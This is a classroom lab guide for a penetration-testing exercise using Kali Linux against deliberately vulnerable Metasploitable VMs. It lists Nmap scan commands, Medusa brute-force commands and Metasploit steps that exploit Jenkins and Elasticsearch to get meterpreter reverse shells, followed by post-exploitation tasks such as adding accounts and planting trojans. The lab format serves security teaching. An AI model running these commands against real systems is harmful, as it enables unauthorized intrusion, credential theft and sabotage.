## Security Fundamentals



### Why Kali?

Kali linux is a customized linux distribution with a set of comprehensive security tools.

### Offensive Security Concepts

Network Scans - NMAP

Run a NMAP scan of your home network

What were the results of that scan?

How would you use this information to exploit the systems in your home?

How can this be applied to real world situations?

Brute Force Tools - Medusa

Use Medusa to brute force the Metasploitable VM

Download these files to prepare for the Medusa exercise

## 100 Worst Passwords Download 👇🏾
[![100 Worst Passwords](bad-password.png)](https://drive.google.com/file/d/1FfxtD9mWs42yHYLKdNEWQ4LCaS795fCn/view?usp=sharing)

## 500 Worst Passwords Download 👇🏾
[![500 Worst Passwords](bad-password.png)](https://drive.google.com/file/d/15nA6025WGWqmMlECpmBBpcIiZM_W3uut/view?usp=sharing)

## 10000 Worst Passwords Download 👇🏾
[![10000 Worst Passwords](bad-password.png)](https://drive.google.com/file/d/1lEPmONYlRsLaDwg1sQc96zrqhjA1SsBj/view?usp=sharing)

## 100K Worst Passwords Download 👇🏾
[![100k Worst Passwords](bad-password.png)](https://drive.google.com/file/d/1uqgJo-tufHYOFl78q0Z39FFlP4vzuaBL/view?usp=sharing)

## 1 Million Worst Passwords Download 👇🏾
[![1Million Worst Passwords](bad-password.png)](https://drive.google.com/file/d/1iJtuQ_NhhZ6IBMZkN3256Q1Nxn6Ah3rz/view?usp=sharing)


### Medusa Brute Force Attack

`medusa -h xxx.xxx.xxx.xxx -U usernames.txt -P password_list.txt -M ssh`

`medusa -C dump_targets.txt -M http`

`medusa -H targets.txt -U usernames.txt -P password_list.txt -M ftp`

`medusa -h xxx.xxx.xxx.xxx -U usernames.txt -P password_list.txt -M ssh`

`medusa -h xxx.xxx.xxx.xxx -u username -P password_list.txt -M http`

`medusa -H targets.txt  -U usernames.txt -p password -M ftp`

Medusa is capable of using the following authenication methods -  AFP, CVS, FTP, HTTP, IMAP, MS-SQL, MySQL, NetWare NCP, NNTP, PcAnywhere, POP3, PostgreSQL, REXEC, RLOGIN, RSH, SMBNT, SMTP-AUTH, SMTP-VRFY, SNMP, SSHv2, Subversion (SVN), Telnet, VMware Authentication Daemon (vmauthd), VNC, Generic Wrapper, Web Form

### Online and Offline Password Cracking - John the Ripper

## Password Hash Download 👇🏾

[![John the Ripper](john-the-ripper.png)](https://drive.google.com/file/d/10hM-tFvCaqhmoTrZrzE1gJRMS1vm1h5X/view?usp=sharing)

john password-hash.txt

### Environment Prep

Download a copy of Kali and import the image into virtualbox

## Kali Virtualbox VM Download 👇🏾
[![Kali](kali.png)](https://drive.google.com/file/d/1a1A3ZAww-ltCLwUiYoSewNnltXDHSWH7/view?usp=sharing)

Download a copy of Metasploitable and import the image into virtualbox
## Metasploitable Virtualbox VM Download 👇🏾
[![Metasploitable](metasploitable.png)](https://drive.google.com/file/d/1r0P-AoztjdHj58SteZlZX5fv5l5wiIux/view?usp=sharing)

Download a copy of the Windows Metasploitable3 and import the image into virtualbox
## Metasploitable3 Virtualbox Windows VM Download 👇🏾
[![Metasploitable3](metasploitable.png)](https://drive.google.com/file/d/1sZV12O3VWJhG7w0mHnkuaPq8UCbXnMeA/view?usp=sharing)

### Environment Prep

Step 1: Launch your Kali VM and make sure the network settings are set to bridged mode

Step 2: Launch your Metasploit VM and make sure the network settings are set to bridged mode

Step 3: If you downloaded my Kali prebuilt image use username of "devops" and the password “D3v0psCr3w!” otherwise use the username and password you created.


### Environment Prep (cont)

Step 4: Verify that your system has a similar IP to your Kali Linux VM.

Step 5: For example if your IP address was 192.168.1.2 your Kali VM’s IP should be 192.168.1.xxx where the xxx is a number between 1 and 254. 

Once you have established that your environment is setup properly you are ready to begin

### Reconnaissance

Run a NMAP scan to what’s vulnerable

Host only scan: `nmap xxx.xxx.xxx.xxx -sn` (shows what hosts are alive)

Quick NMAP scan: `nmap –F xxx.xxx.xxx.xxx` (scans 100 ports per host)

Host identification scan: `nmap –sV -O xxx.xxx.xxx.xxx` (what’s important here)

Longer more thorough scan – `nmap –p- xxx.xxx.xxx.xxx` (scans all ports)

Nmap scan of entire class C network
`sudo nmap -sT xxx.xxx.xxx.0/24`

Nmap scan of single host on ports 80 and 443
`sudo nmap -sT -p 80,443 xxx.xxx.xxx.xxx`

Nmap scan stealth scan of single host
`sudo nmap -sS xxx.xxx.xxx.xxx`

Nmap scan of single host to identify OS
`sudo nmap -O xxx.xxx.xxx.xxx`

Nmap scan of single host to identify OS with addiional detail
`sudo nmap -A xxx.xxx.xxx.xxx`

Nmap scan stealth scan of single host with decoy IP to evade detection
`sudo nmap -sS xxx.xxx.xxx.xxx xxx.xxx.xxx.xxx`

Nmap scan or single host using all know vunerabilities
`sudo nmap -script vuln xxx.xxx.xxx.xxx`


### Reconnaissance Cont

When running a nmap scan you can use the following to pipe the output into a file so that you can reference the hosts that you found that might be available to exploit

`nmap xxx.xxx.xxx.xxx -sn > ~/ipscan.txt`

You can also run a scan pre and post starting your metasploitable VM and run the scan results through vimdiff to narrow down the results.

Cmd Example: vmdiff before.txt after.txt


### Evaluate

How many hosts did you find?

What ports are available to exploit?

What kind of exploit or brute for attack can you run against those ports?

Run an exploit on the system to obtain reverse shell or brute force known accounts

### Exploit

When executing an exploit please remember that you may need to specify the following options

This is the command you use to set the host you are going to run the exploit against once you locate it on your network

`set RHOSTS xxx.xx.xxx.xxx`

This is the command you use to set the port of the host you are trying to exploit

`set RPORT xxxx`

Sets the target IP globally so that you don't have to set the target IP each time you switch exploits

`setg RHOSTS`

Starts the exploit against the system you specified with the set rhost command

`run`

Other options: `set username`, `set password`

Exploit

This is the root folder that is searched when an exploit is run

`set targeturi`

This is the number of threads you want to launch against a host you want to attack

`set threads`

This is the port you will deliver the exploit from meaning a port on your system

`set srvport`

Use this tool to search for the specific types of exploits you want to launch against a target

`grep exploit search service_type`


### Investigating Open Ports

`use auxiliary/scanner/http/http_version`

`set RPORT 9200`

`run`

What was the result?

What things use port 9200? Elastic search 

`set RPORT 8484`

`run`

What was the result?

What things use port 8484? Jenkins

`set RPORT 8585`

`run`

What was the result?

What things use port 8585? WAMP is Windows, Apache, MySQL, and PHP

### Probe system for Jenkin information

`use auxiliary/scanner/http/jenkins_enum`

`set RPORT 8484`

`set TARGETURI /`

`run`

### Exploit Jenkins on Metasploitable3

This is the command you use to set the host you are going to run the exploit against once you locate it on your network

`set rhosts xxx.xx.xxx.xxx`

`use exploit/multi/http/jenkins_script_console`

`set RPORT 8484`

`set TARGETURI /`

`set RHOST xxx.xxx.xxxx.xxx` (This is the IP of your target)

`set PAYLOAD windows/meterpreter/reverse_tcp'

Starts the exploit against the system you specified with the set rhost command.

`exploit`

If your exploit is successful you should get a meterpreter prompt where you can run remote commands on the Windows host. If you type in the following command it will tell you which level of context your account is running as

`getuid`

If you cannot gain elevated priviliges using the Jenkins backdoor then try this exploit

`use exploit/multi/elasticsearch/script_mvel_rce`

What options do you need to pay attention to when using this exploit?

Hint: for the PAYLOAD you should use the java/meterpreter/reverse_tcp

When you have a meterpreter prompt type in the following command

`getuid` (This will tell you which user or service account you are running as)

`shell` (this command will drop you into the windows command shell)

Now research what commands you can run under windows to create an account that will allow you to login to your Metasploitable Windows host.

*** Hint the command is `net user`***

### Create, Elevate & Gain access

Connect to a remote or local system via rdp with a named account that you know the password to

### Now What?

Add additional accounts

Search the system for sensitive data

Delete files

Change data on system or services running on the system

Plant a virus or trojan

Attack other systems from this system

### Why is this exercise important?

It’s vital to understanding the command line

It’s critical to understanding security and vulnerabilities

If you don’t practice using these tools you will not understand the material 

### Hacking Exercise

Use Kali to find exploits in Metasploitable and Metasploitable3

Break up into two team and name your team

Team with the most points wins

***Total possible points 400***

120 Possible points for exploit

120 possible points for demo or recording exploints

120 possible points for documenting how each exploit works

40 points for the best presentation

Team with the most points wins

